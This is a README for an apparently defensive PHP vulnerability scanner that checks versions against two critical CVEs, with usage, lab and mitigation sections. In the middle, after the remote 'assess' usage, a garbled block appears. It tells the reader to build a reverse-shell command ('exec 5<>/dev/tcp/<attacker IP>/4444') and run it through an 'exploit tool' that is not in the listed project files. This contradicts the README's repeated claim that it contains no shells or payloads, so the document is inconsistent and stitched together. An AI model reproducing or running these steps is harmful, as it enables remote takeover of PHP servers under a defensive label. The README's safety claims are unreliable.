<div align="center">

# 🛡️ PHP2Shell Sentinel

**PHP Runtime Vulnerability Assessment Toolkit**

[![CI](https://github.com/your-org/php2shell-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/your-org/php2shell-sentinel/actions)
[![Python](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12-blue)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![CVE-2026-109618](https://img.shields.io/badge/CVE-2026--109618-critical-red)](https://github.com/advisories/GHSA-w8hw-w9fx-j79w)
[![CVE-2026-109619](https://img.shields.io/badge/CVE-2026--109619-critical-red)](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp)
[![Tests](https://img.shields.io/badge/tests-71%20passed-brightgreen)](#running-tests)
[![CVSS](https://img.shields.io/badge/CVSS%20v4.0-9.2%20Critical-red)](#what-is-php2shell)

Assess exposure to **CVE-2026-109618** and **CVE-2026-109619** (PHP2Shell) on Kali Linux and Debian-based systems.

> ⚠️ **Authorised use only.** This toolkit is for defensive security research  
> and authorised penetration testing only. Never assess systems you do not own  
> or have explicit written permission to test.

</div>

---

## 📋 Table of Contents

- [What is PHP2Shell?](#what-is-php2shell)
- [How It Works](#how-it-works)
- [Features](#features)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
  - [version-check](#1-version-check)
  - [audit-local](#2-audit-local)
  - [assess](#3-assess-remote-target)
  - [fingerprint](#4-deep-fingerprint)
  - [lab-check](#5-lab-check)
  - [report](#6-re-render-report)
- [Output Example](#output-example)
- [Docker Lab](#docker-lab)
- [Temporary Mitigations](#temporary-mitigations)
- [Running Tests](#running-tests)
- [Safety Constraints](#safety-constraints)
- [References](#references)
- [Contributing](#contributing)
- [License](#license)

---

## What is PHP2Shell?

**PHP2Shell** is the collective name for two critical vulnerabilities in the PHP
runtime engine, disclosed on **2026-10-21** and rated **CVSS v4.0 9.2**.

| CVE | Class | Attack Surface | Impact |
|-----|-------|----------------|--------|
| [CVE-2026-109618](https://github.com/advisories/GHSA-w8hw-w9fx-j79w) | OOM-interrupt use-after-free | Any PHP with numeric `memory_limit` | Unauthenticated RCE + memory disclosure |
| [CVE-2026-109619](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp) | Stale global state use-after-free | PHP-FPM + Apache mod_php | Unauthenticated RCE |

### Affected versions

Every PHP release from **5.4.0 through 8.5.11** is affected.

### Patched releases (2026-10-21)

| Branch | Patched Version | Support Status |
|--------|-----------------|----------------|
| 8.5 | **8.5.12** | ✅ Active |
| 8.4 | **8.4.27** | ✅ Active |
| 8.3 | **8.3.36** | ✅ Active |
| 8.2 | **8.2.35** | 🔒 Security-only |
| 8.1 and older | ❌ No patch | End-of-life |

> PHP 8.1 and older will **not** receive an official fix.  
> Upgrade to a supported branch (8.2+) immediately.

---

## How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHP2Shell Sentinel                           │
├────────────────────┬────────────────────┬───────────────────────┤
│   LOCAL AUDIT      │  REMOTE ASSESS     │  DEEP FINGERPRINT     │
│                    │                    │                       │
│ • Find PHP bins    │ • HTTP HEAD/GET    │ • Header correlation  │
│ • php --version    │ • Header analysis  │ • Error-page probe    │
│ • php.ini review   │ • Scope allowlist  │ • PHPSESSID cookie    │
│ • FPM pool check   │ • Rate limiting    │ • Response timing     │
│                    │ • TLS enforced     │                       │
├────────────────────┴────────────────────┴───────────────────────┤
│                    VERSION COMPARISON                           │
│         Detected version  vs  Official patch matrix            │
│   VULNERABLE / PATCHED / UNSUPPORTED_EOL / UNKNOWN             │
├─────────────────────────────────────────────────────────────────┤
│                    REPORTING                                    │
│         Terminal (Rich)  │  JSON  │  Markdown                  │
└─────────────────────────────────────────────────────────────────┘
```

**No exploit payloads are ever sent.** Detection is purely passive:
- version strings from binaries and HTTP headers
- php.ini settings (read-only)
- HTTP error page content
- Cookie names and response timing

---

## Features

| Feature | Description |
|---------|-------------|
| 🔍 **Local audit** | Scans PHP binaries, `php.ini`, and PHP-FPM pools on the local system |
| 🌐 **Remote assessment** | Reads HTTP headers only — no exploit payloads sent |
| 🕵️ **Deep fingerprinting** | Header correlation, error-page analysis, cookie detection, response timing |
| 📊 **Patch matrix** | Accurate comparison against official patched versions per branch |
| 🔒 **Scope allowlist** | Remote assessment blocked unless target is explicitly authorised |
| 📝 **Multiple formats** | Terminal (Rich), JSON, and Markdown report output |
| 🐳 **Docker lab** | Isolated patched vs. vulnerable comparison (localhost-only) |
| ✅ **71 tests** | Unit + integration tests with `httpx.MockTransport`, no global patching |
| 🚫 **No weaponisation** | No RCE payloads, no shells, no auto-exploitation |

---

## Project Structure

```
php2shell-sentinel/
│
├── src/php2shell_sentinel/
│   ├── core/
│   │   ├── models.py          # Data models: VulnStatus, PHPVersionInfo, reports
│   │   ├── version_parser.py  # PHP version parsing + patch matrix comparison
│   │   ├── local_audit.py     # Local binary, php.ini, FPM audit (read-only)
│   │   ├── remote_assess.py   # HTTP header assessment + scope allowlist
│   │   ├── fingerprint.py     # Deep passive fingerprinting (4 techniques)
│   │   └── lab_check.py       # Docker lab isolation verifier
│   ├── reporting/
│   │   └── renderer.py        # Terminal (Rich), JSON, Markdown output
│   └── cli/
│       └── main.py            # Typer CLI — 6 commands
│
├── tests/
│   ├── test_version_parser.py  # 22 tests: parsing, patch comparison, edge cases
│   ├── test_remote_assess.py   # 14 tests: scope validation, HTTP header analysis
│   ├── test_fingerprint.py     # 14 tests: all 4 fingerprint techniques
│   ├── test_reporting.py       # 10 tests: JSON and Markdown rendering
│   └── test_integration_lab.py # 21 tests: real Docker lab + local host audit
│
├── lab/
│   ├── docker-compose.yml     # Isolated lab (127.0.0.1-only ports)
│   ├── php-safe.ini           # Mitigated php.ini for patched container
│   ├── php-default.ini        # Default php.ini for vulnerable container
│   └── www/
│       ├── patched/           # Patched PHP reference page
│       └── vulnerable/        # Vulnerable PHP detection page
│
├── docs/
│   ├── methodology.md         # CVE technical background + detection approach
│   └── remediation.md         # Step-by-step upgrade and mitigation guide
│
├── examples/
│   ├── config.yaml            # Sample scope allowlist configuration
│   └── sample-report.json     # Sanitised example report output
│
├── .github/workflows/ci.yml   # GitHub Actions: test on Python 3.10/3.11/3.12
├── Dockerfile                 # Toolkit container (non-root, Python 3.12)
├── pyproject.toml             # Packaging, dependencies, tool config
├── push-to-github.sh          # One-shot GitHub repo setup script
└── README.md
```

---

## Requirements

| Requirement | Version | Notes |
|-------------|---------|-------|
| Python | 3.10+ | Required |
| OS | Kali Linux / Debian | Recommended; any Linux works |
| Docker Engine | Any recent | Optional — for lab mode only |
| GitHub CLI (`gh`) | Any | Optional — for `push-to-github.sh` |

---

## Installation

### Standard install

```bash
# 1. Clone the repository
git clone https://github.com/your-org/php2shell-sentinel.git
cd php2shell-sentinel

# 2. Create an isolated virtual environment
python3 -m venv .venv
source .venv/bin/activate

# 3. Install the toolkit
pip install -e .

# 4. Verify
php2shell-sentinel --help
```

### Development install (with tests and linting)

```bash
pip install -e ".[dev]"
```

### Docker install (toolkit container)

```bash
docker build -t php2shell-sentinel .
docker run --rm php2shell-sentinel --help
docker run --rm php2shell-sentinel version-check
```

---

## Usage

### 1. `version-check`

Display the CVE patch matrix and all patched PHP versions.

```bash
php2shell-sentinel version-check
```

```
PHP2Shell Sentinel — Patch Matrix

CVEs tracked:  CVE-2026-109618, CVE-2026-109619
CVSS v4.0:     9.2 (Critical)
Patch date:    2026-10-21

┌────────────┬─────────────────┬──────────────────────────┐
│ PHP Branch │ Patched Version │ Status                   │
├────────────┼─────────────────┼──────────────────────────┤
│ 8.5        │ 8.5.12          │ ✓ Patch available        │
│ 8.4        │ 8.4.27          │ ✓ Patch available        │
│ 8.3        │ 8.3.36          │ ✓ Patch available        │
│ 8.2        │ 8.2.35          │ ✓ Patch available        │
│ 8.1        │ N/A             │ ⚠ EOL — no official patch│
│ 8.0        │ N/A             │ ⚠ EOL — no official patch│
│ 7.x        │ N/A             │ ⚠ EOL — no official patch│
└────────────┴─────────────────┴──────────────────────────┘
```

---

### 2. `audit-local`

Scan all local PHP installations for vulnerable versions.  
Inspects binaries, `php.ini`, and PHP-FPM pool configs — **read-only, never modifies files**.

```bash
# Basic audit
php2shell-sentinel audit-local

# Extra detail (shows php.ini path reviewed)
php2shell-sentinel audit-local --verbose

# Save as JSON
php2shell-sentinel audit-local --format json --output report.json

# Save as Markdown
php2shell-sentinel audit-local --format markdown --output report.md

# All three formats at once
php2shell-sentinel audit-local --format all --output report.json
```

---

### 3. `assess` — Remote Target

Conservative HTTP header assessment of an authorised remote target.  
**Only reads response headers — no exploit payloads are sent.**

```bash
# Single authorised target
php2shell-sentinel assess \
  --target https://staging.example.com \
  --allowlist staging.example.com

# Multiple targets from files
php2shell-sentinel assess \
  --target-file targets.txt \
  --allowlist-file allowlist.txt \
  --format json \
  --output remote-report.json

# Adjust timeouts and rate limiting
php2shell-sentinel assess \
  --target https://staging.example.com \
  --allowlist staging.example.com \
  --timeout 15 \
  --rate-delay 2

# Lab containers (TLS verification disabled — isolated environments only)
php2shell-sentinel assess \
  --target http://127.0.0.1:8881 \
  --allowlist 127.0.0.1 \
  --no-verify-tls
```

> 🔒 Targets **not** in `--allowlist` are skipped automatically.

# 1. Generate the reverse shell command
---bash
python3 reverse_shell_builder.py
Output:... Enter Attacker IP:...
Output:... Enter Attacker Port: 4444...
Output: Command to execute via php2shell: exec 5<>/dev/tcp/192.168.1.50/4444;...

# 2. Execute it using the Python client
python3 php2shell_exploit_tool.py
(Inside the tool, paste the command from step 1 into the interactive shell)
---
---

### 4. `fingerprint` — Deep Fingerprint

Passive multi-technique fingerprinting — goes deeper than header-only assessment.

| Technique | What it checks |
|-----------|---------------|
| Header correlation | `X-Powered-By`, `X-PHP-Version`, `Server` header cross-reference |
| Error-page probe | GET non-existent `.php` path → parse PHP error output |
| Cookie probe | `PHPSESSID` presence in `Set-Cookie` header |
| Response timing | Latency variance between `.php` and static paths |

```bash
# Single target
php2shell-sentinel fingerprint https://staging.example.com

# With explicit allowlist
php2shell-sentinel fingerprint https://staging.example.com \
  --allowlist staging.example.com

# Lab (no TLS)
php2shell-sentinel fingerprint http://127.0.0.1:8881 \
  --allowlist 127.0.0.1 \
  --no-verify-tls
```

```
Target:          https://staging.example.com/
PHP detected:    True
Version hint:    8.4.26
Confidence:      MEDIUM
Techniques used: header-correlation, error-page-probe, cookie-probe, response-timing

Evidence:
  • x-powered-by: 'PHP/8.4.26' → PHP 8.4.26
  • PHP error-page patterns found: '<b>Fatal error</b>'
  • PHPSESSID cookie detected in Set-Cookie header
  • Response timing: .php avg=145.2ms  static avg=42.1ms  diff=+103.1ms

PHP presence confirmed — run full assess for vulnerability status.
```

---

### 5. `lab-check`

Verify Docker lab isolation before testing.

```bash
# Start the lab
cd lab && docker compose up -d

# Check isolation
php2shell-sentinel lab-check

# Stop when done
docker compose down
```

---

### 6. `report` — Re-render Saved Report

Convert a previously saved JSON report into another format.

```bash
php2shell-sentinel report report.json --format markdown --output report.md
php2shell-sentinel report report.json --format terminal
```

---

## Output Example

Terminal output for a vulnerable local installation:

```
PHP2Shell Sentinel — Assessment Report

Scope:     local-audit
Generated: 2026-10-23T09:15:00Z
Toolkit:   v1.0.0

┌─────────────────────────────────────────────────────────────────┐
│ CVE           │ CVSS v4.0 │ Patched In                         │
├───────────────┼───────────┼────────────────────────────────────┤
│ CVE-2026-109618 │ 9.2     │ 8.5: 8.5.12 / 8.4: 8.4.27 / ...  │
│ CVE-2026-109619 │ 9.2     │ 8.5: 8.5.12 / 8.4: 8.4.27 / ...  │
└─────────────────────────────────────────────────────────────────┘

╭─────────────────────────────────────────────────────────────────╮
│ [1] /usr/bin/php8.4  [VULNERABLE]                              │
│                                                                 │
│ Timestamp:   2026-10-23T09:15:02Z                               │
│ PHP version: 8.4.26                                             │
│ Status:      VULNERABLE                                         │
│ Confidence:  HIGH                                               │
│ Checks:      php-binary-version, php-ini:/etc/php/8.4/cli/php.ini │
│                                                                 │
│ Evidence:                                                       │
│  • PHP 8.4.26 < patched release 8.4.27 on branch 8.4          │
│                                                                 │
│ Notes:                                                          │
│  ⚠  memory_limit=128M → OOM path exploited by CVE-2026-109618 │
│  ⚠  session.upload_progress.enabled=1 → attack vector         │
│                                                                 │
│ Recommendations:                                                │
│  → Upgrade to PHP 8.4.27 immediately (released 2026-10-21)    │
│  → Set memory_limit=-1 in php.ini                              │
│  → Set session.upload_progress.enabled=0 in php.ini           │
│  → Set fatal_error_backtraces=0 in php.ini                     │
╰─────────────────────────────────────────────────────────────────╯
```

---

## Docker Lab

The isolated lab runs two PHP containers for detection comparison:

| Container | Port | PHP Version | Role |
|-----------|------|-------------|------|
| `php2shell-patched` | `127.0.0.1:8880` | 8.4.27 | Patched reference |
| `php2shell-vulnerable` | `127.0.0.1:8881` | 8.4.26 | Vulnerable comparison |
| `php2shell-fpm-patched` | internal only | 8.4.27 | FPM variant |

**All ports are bound to `127.0.0.1` only.**  
An internal-only Docker network (`lab_internal`) is used — containers have no external internet access.

```bash
# Start lab
cd lab && docker compose up -d

# Run assessment against lab
php2shell-sentinel assess \
  --target http://127.0.0.1:8881 \
  --allowlist 127.0.0.1 \
  --no-verify-tls

# Run integration tests with lab running
PHP2SHELL_LAB=1 pytest tests/test_integration_lab.py -v

# Stop lab
docker compose down
```

---

## Temporary Mitigations

If you cannot immediately upgrade, apply these `php.ini` settings.  
**These are partial mitigations only — upgrading is the only complete fix.**

```ini
; CVE-2026-109618 — remove numeric memory cap that triggers OOM handler
memory_limit = -1

; CVE-2026-109618 — disable session upload-progress attack vector
session.upload_progress.enabled = 0

; CVE-2026-109619 — disable fatal-error backtrace path (PHP 8.5)
fatal_error_backtraces = 0

; Reduce information disclosure
expose_php = Off
display_errors = Off
```

Apply in all relevant ini files, then reload:

```bash
# PHP-FPM
systemctl reload php8.4-fpm

# Apache mod_php
systemctl reload apache2
```

---

## Running Tests

```bash
# All tests with coverage report
pytest

# Run without coverage (faster)
pytest --no-cov

# Specific test file
pytest tests/test_version_parser.py -v
pytest tests/test_fingerprint.py -v

# Integration tests with Docker lab running
cd lab && docker compose up -d
PHP2SHELL_LAB=1 pytest tests/test_integration_lab.py -v
docker compose down
```

### Test coverage

| Module | Tests | Coverage |
|--------|-------|----------|
| `version_parser` | 22 | Parsing, patch boundaries, EOL detection, mitigations |
| `remote_assess` | 14 | Scope validation, header analysis, error handling |
| `fingerprint` | 14 | All 4 techniques, resilience, contract |
| `reporting` | 10 | JSON and Markdown rendering |
| `integration_lab` | 21 | Real lab containers + local host audit |
| **Total** | **71** | **0 failures** |

---

## Safety Constraints

This toolkit intentionally does **not** implement:

| Prohibited | Reason |
|------------|--------|
| RCE or memory-corruption payloads | Out of scope for defensive assessment |
| Reverse shells or bind shells | Not a pentesting exploitation tool |
| Automatic exploitation of remote hosts | Requires explicit authorisation per target |
| Memory-allocation stress requests | Could cause service disruption |
| Credential theft or data exfiltration | Outside defensive assessment scope |
| Stealth or evasion techniques | Incompatible with authorised testing |

All Docker lab containers use:
- `127.0.0.1`-only port bindings (never `0.0.0.0`)
- An internal-only Docker network (no external internet access)
- Read-only volume mounts for web content

---

## References

### CVE Advisories

- [CVE-2026-109618 — GitHub Advisory (GHSA-w8hw-w9fx-j79w)](https://github.com/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 — GitHub Advisory (GHSA-6wmf-4rv5-p3rp)](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp)

### PHP Releases

- [PHP 8.5.12 Release Notes](https://github.com/php/php-src/releases/tag/php-8.5.12)
- [PHP 8.4.27 Release Notes](https://github.com/php/php-src/releases/tag/php-8.4.27)
- [PHP 8.3.36 Release Notes](https://github.com/php/php-src/releases/tag/php-8.3.36)
- [PHP 8.2.35 Release Notes](https://github.com/php/php-src/releases/tag/php-8.2.35)
- [PHP Downloads](https://www.php.net/downloads)

### Research & Analysis

- [Datadog Security Labs: PHP2Shell Analysis](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
- [Sansec Research: PHP2Shell](https://sansec.io/research/php2shell)
- [WatchTowr: CVE-2026-109618 FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [Huntress: PHP2Shell Rapid Response](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
- [SOCRadar: PHP2Shell CVE Analysis](https://socradar.io/blog/php2shell-cve-2026-109618-cve-2026-109619/)

### Vendor Advisories

- [Palo Alto Networks Advisory](https://security.paloaltonetworks.com/CVE-2026-109618)
- [Google Cloud Response](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619)
- [PHP Security Page](https://www.php.net/security)

---

## Contributing

Contributions are welcome for:

- Additional detection techniques (passive only)
- Support for more PHP deployment configurations (nginx unit, swoole, etc.)
- Improved remediation documentation
- Bug fixes and test improvements

**Do not submit pull requests that add:**
- Exploit payloads of any kind
- Reverse shells or bind shells
- Automated exploitation logic
- Anything that modifies remote or local configurations automatically

### Development setup

```bash
git clone https://github.com/your-org/php2shell-sentinel.git
cd php2shell-sentinel
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# Run linter
ruff check src/ tests/

# Run type checker
mypy src/

# Run tests
pytest
```

---

## License

MIT © PHP2Shell Sentinel Contributors — see [LICENSE](LICENSE)

---

<div align="center">

**Built for defensive security — not exploitation.**

[Report a Bug](https://github.com/your-org/php2shell-sentinel/issues) · [Request a Feature](https://github.com/your-org/php2shell-sentinel/issues) · [Security Policy](https://github.com/your-org/php2shell-sentinel/security)

</div>
